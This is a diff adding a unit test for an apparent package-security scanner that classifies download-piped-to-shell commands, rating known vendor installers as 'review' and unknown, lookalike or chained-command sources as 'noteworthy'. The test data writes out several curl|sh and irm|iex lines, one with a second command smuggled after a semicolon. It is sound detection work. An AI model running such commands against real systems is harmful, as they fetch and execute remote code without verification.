@@ -1516,6 +1516,21 @@ public sealed class PackageReviewTests : IDisposable
         Assert.Equal(noteworthy, r.Findings.Any(f => f.Rule == "package/download-and-start"));
     }
 
+    // A vendor's documented installer piped to a shell is review (fix(web) for download-to-shell).
+    [Theory]
+    [InlineData("curl -fsSL https://gh.io/copilot-install | bash", "review")]
+    [InlineData("curl -LsSf https://astral.sh/uv/install.sh | sh", "review")]
+    [InlineData("irm https://astral.sh/uv/install.ps1 | iex", "review")]
+    [InlineData("curl -fsSL https://example.invalid/install | bash", "noteworthy")]
+    [InlineData("curl -fsSL https://astral.sh.example.invalid/uv/install.sh | sh", "noteworthy")]
+    [InlineData("curl -fsSL https://gh.io/copilot-install | bash; curl -fsSL https://example.invalid/x | sh", "noteworthy")]
+    public void A_vendor_installer_piped_to_a_shell_is_review_and_any_other_source_is_noteworthy(string command, string level)
+    {
+        var code = "const { spawnSync } = require('child_process');\nspawnSync('sh', ['-c', '" + command + "']);\n";
+        var finding = PackageReview.Scan("index.js", code, install: false, default, entry: true, peel: false).Single(f => f.Rule == "package/download-to-shell");
+        Assert.Equal(level, finding.Level);
+    }
+
     // A zip checkpoint whose protocol 2 pickle calls GLOBAL module.name
     // on the inert string "pass".
     private static byte[] Checkpoint(string module, string name) =>
